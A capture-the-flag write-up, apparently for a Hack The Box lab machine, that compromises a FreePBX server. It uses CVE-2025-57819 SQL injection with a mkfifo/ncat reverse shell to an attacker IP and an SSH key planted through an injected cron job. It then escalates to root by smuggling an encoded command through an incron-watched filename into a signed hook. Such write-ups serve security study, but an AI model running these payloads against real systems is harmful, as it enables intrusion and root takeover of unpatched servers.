Run a nmap scan:
```sh
$ sudo nmap -Pn -sV -sC -p- -A 10.129.8.83 -oN connected.nmap 
# Nmap 7.98 scan initiated Mon Jun 22 05:41:47 2026 as: /usr/lib/nmap/nmap -Pn -sV -sC -p- -A -oN connected.nmap 10.129.8.83
Nmap scan report for 10.129.8.83
Host is up (0.19s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.19 (90%), OpenWrt 21.02 (Linux 5.4) (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   225.22 ms 10.10.16.1
2   225.28 ms 10.129.8.83

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 22 05:49:50 2026 -- 1 IP address (1 host up) scanned in 483.74 seconds
```

From the nmap scan, we know that the target is running an Apache web server hosting a simple web.

Add domain to `/etc/hosts`:
```
10.129.8.83   connected.htb
```

Recon the web, we notice it is running FreePBX on version 16.0.40.7. This version is vulnerable to CVE-2025-57819 an Unauthenticated SQL injection that leads to RCE.
Use [this python script](CVE-2025-57819.py) to gain a reverse shell:

```sh
$ python CVE-2025-57819.py -k http://connected.htb --cmd 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 10.10.17.81 9999 >/tmp/f'
```

At our host, spawn a listener and upgrade the shell to read the flag:

```sh
$ ssh-keygen -t ed25519 -C "htb"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519):
Created directory '/home/kali/.ssh'.
Enter passphrase for "/home/kali/.ssh/id_ed25519" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kali/.ssh/id_ed25519
Your public key has been saved in /home/kali/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:6+aiJC2rw0i8EOJWPKgcOt+YN3Q8u3qvYBwp5qsuR8M htb
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|  o              |
|oo + .           |
|Bo= +.  S        |
|=OE+..+  .       |
|*+=**. o.        |
|+o=B+.+..        |
|=*o.o=oB+        |
+----[SHA256]-----+
$ python CVE-2025-57819.py --privkey ~/.ssh/id_ed25519 --pubkey ~/.ssh/id_ed25519.pub 10.129.9.67

CVE-2025-57819  FreePBX endpoint SQLi -> SSH key drop
  Target : https://10.129.8.83/admin/ajax.php
  SSH    : asterisk@10.129.8.83:22
  Pubkey : ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFVhsUlsrxA2HF...
  Cron   : poc-jtuusc

[*] Verifying unauthenticated SQLi...
[+] SQLi confirmed (db: freepbxuser@localhost, version: 5.5.65-MariaDB)
[*] Injecting authorized_keys writer into cron_jobs...
[+] Injected. Cron fires every minute; polling SSH for up to 150s...
[+] SSH key accepted!
    uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
    connected
    Warning: Permanently added '10.129.8.83' (ED25519) to the list of known hosts.
    ** WARNING: connection is not using a post-quantum key exchange algorithm.
    ** This session may be vulnerable to "store now, decrypt later" attacks.
    ** The server may need to be upgraded. See https://openssh.com/pq.html
[*] Removing cron job 'poc-jtuusc'...

[+] Reliable access established. Reconnect any time with:
    ssh -i /home/kali/.ssh/id_ed25519 asterisk@10.129.8.83

[*] Dropping into interactive SSH session...
Warning: Permanently added '10.129.8.83' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /                                                                                                              
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V /                                                                                                               
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \                                                                                                               
| |    | |   |  __/|  __/| |    | |_/ // /^\ \                                                                                                              
\_|    |_|    \___| \___|\_|    \____/ \/   \/                                                                                                              
                                                                                                                                                            
                                                                                                                                                            
NOTICE! You have 3 notifications! Please log into the UI to see them!                                                                                       
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | 00:50:56:B9:15:15 | 10.129.8.83               |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected ~]$ cat /home/asterisk/user.txt
586c4d9cf09e587e62895eb464fb7c5b
```

Transfer linpeas.sh to the target via SCP and run a probe to find LPE vectors:

```sh
$ scp linpeas.sh asterisk@10.129.8.83:/tmp
```

Notice these cron jobs:

```
$ ./linpeas.sh
<SNIP>
══════════╣ Check for vulnerable cron jobs (T1053.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                        
══╣ Cron jobs list (T1053.003)
<SNIP>
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```

These are not normal cron jobs. They are incron table entries. `incrond` runs as root and watches filesystem events, then runs a command when one fires:

```
<watched path>   <event>           <command run as root>
```

Confirm `incrond` is running as root:

```sh
$ ps -ef | grep -i incron | grep -v grep
root        789      1  0 03:19 ?        00:00:00 /usr/sbin/incrond
```

The interesting entry is:

```
/var/spool/asterisk/incron   IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE   /usr/bin/sysadmin_manager $#
```

`/var/spool/asterisk/incron` is owned by and writable as `asterisk` (our user), and `$#` expands to the **name of the file** we create there. So whenever we drop a file into that directory, root runs `sysadmin_manager <filename>`. The filename is the attacker-controlled input.

`/usr/bin/sysadmin_manager` is deliberately defensive:

- It parses the filename as `module.hook.params`.
- It GPG-verifies the module's `module.sig` against a hard-coded **whitelist of Sangoma signing keys**, and SHA256-checks the hook file against that signature — so you cannot point it at a tampered/attacker-supplied hook.
- It strips dangerous characters from `params` before running the hook:

```php
if (preg_match('/[`\'"$><&;]/', $params)) { ...exit; }   // blocks  ` ' " $ > < & ;
if (preg_match('/[^\x20-\x7e]/', $params)) { ...exit; }   // printable ASCII only
system("$hookfile $params");                              // runs the SIGNED hook as root
```

The trick is not to bypass these checks — it is to ride a **legitimate, signed hook** whose own logic gives us code execution. The `api` module is signed by a whitelisted key, and it ships the hook `api/hooks/fwconsole-commands`.

```sh
$ cat /var/www/html/admin/modules/api/hooks/fwconsole-commands
```
```php
$command = $argv[1];
if (isset($argv[1])) {
        $b = str_replace('_', '/', $argv[1]);                       // un-mangle base64
        $settings = @json_decode(gzuncompress(@base64_decode($b)), true);
        if (is_array($settings)) {
                $command = $settings[0];                            // <-- attacker controlled
                $txn_id  = $settings[1];
        }
}
...
$cmd = "/usr/sbin/fwconsole $command 2>&1";
$result = exec($cmd, $output, $return);                             // runs as ROOT
```

The hook **decodes its parameter itself** (`str_replace('_','/')` → `base64_decode` → `gzuncompress` → `json_decode`) and concatenates the result straight into a root `exec()`. Two things follow:

1. Because the hook decodes the param, our real payload travels as an **opaque base64/zlib blob** — it contains none of the characters `sysadmin_manager` blocks and is all printable ASCII, so it sails through both filters.
2. The decoded string is glued **after** `/usr/sbin/fwconsole`, so it is interpreted as *arguments to fwconsole*. To run our own command we lead with a valid fwconsole subcommand (`help`) and then break out with `;`.

The filename must be `api.fwconsole-commands.<blob>`, where `<blob> = base64(zlib(json([cmd, txn]))) ` with `/` replaced by `_` (mirroring the hook's decoder). The matching encoder is just a one-liner with PHP (already on the box):

```sh
FN=$(php -r '$cmd="help; cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"; echo "api.fwconsole-commands.".str_replace("/","_",base64_encode(gzcompress(json_encode([$cmd,"txn"], JSON_UNESCAPED_SLASHES))));')
echo "$FN"
# api.fwconsole-commands.eJyL...
```

When root runs the hook, `/bin/sh` parses the final command as:

```sh
/usr/sbin/fwconsole help;            # valid fwconsole subcommand, exits 0
cp /bin/bash /tmp/rootbash;          # runs as ROOT  -> copies bash
chmod +s /tmp/rootbash 2>&1          # runs as ROOT  -> sets SUID bit
```

Drop the trigger file. `incrond` fires instantly and `sysadmin_manager` even `unlink()`s the file as its first action, so it "disappears" the moment you create it — that is expected, the hook has already run.

```sh
$ touch "/var/spool/asterisk/incron/$FN"
$ sleep 4
$ ls -l /tmp/rootbash
-rwsr-sr-x 1 root root ... /tmp/rootbash
$ /tmp/rootbash -p -c 'id; cat /root/root.txt'
uid=999(asterisk) gid=1000(asterisk) euid=0(root) egid=0(root) groups=...
1e046e240d626811d3af1f5362626d4b
```

`bash -p` preserves the SUID `euid=0` instead of dropping privileges, giving a root shell.

### Chain summary

```
touch /var/spool/asterisk/incron/api.fwconsole-commands.<blob>   (as asterisk)
        │  IN_CLOSE_WRITE
        ▼
incrond (root) ── /usr/bin/sysadmin_manager api.fwconsole-commands.<blob>
        ├─ GPG-verify api/module.sig vs whitelist .......... ✓ (legit signed module)
        ├─ hash-check hooks/fwconsole-commands ............. ✓
        ├─ param filters (no  `'"$><&; , printable only) ... ✓ (blob is base64-safe)
        └─ system(".../api/hooks/fwconsole-commands <blob>")
                 └─ hook decodes blob → exec("/usr/sbin/fwconsole help; cp /bin/bash /tmp/rootbash; chmod +s ...")
                          └─ SUID root bash dropped → /tmp/rootbash -p → root
```